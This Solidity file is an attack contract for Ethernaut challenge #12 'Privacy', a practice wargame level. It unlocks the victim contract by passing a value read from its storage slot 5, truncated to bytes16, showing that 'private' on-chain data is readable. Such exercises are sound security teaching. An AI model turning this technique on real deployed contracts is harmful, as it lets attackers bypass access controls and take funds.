// SPDX-License-Identifier: MIT
// Locked pragma
pragma solidity 0.8.0;

// Victim contract
import './Privacy.sol';

/// @title Ethernaut challenge # 12, unlock victim contract to beat the level.
/// @author Web3 Blockchain Developer
contract PrivacyAttack {
    /// @dev State variable of address value type assigned in constructor.
    Privacy target;

    /** @notice Victim contract address Privacy is entered before the attack 
    contract is deployed and assigned as state variable target during deployment. */
    constructor(address _targetAddress) public {
        target = Privacy(_targetAddress);
    }

    /** @notice Player will call the unlock function on the victim contract and enter 
    the bytes32 value found in storage slot 5 of the victim contract, and convert it to 
    bytes16 to beat this level! See victim contract Privacy to see an explanation of 
    how to find the correct storage slot. */
    function unlock(bytes32 _slotValue) public {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}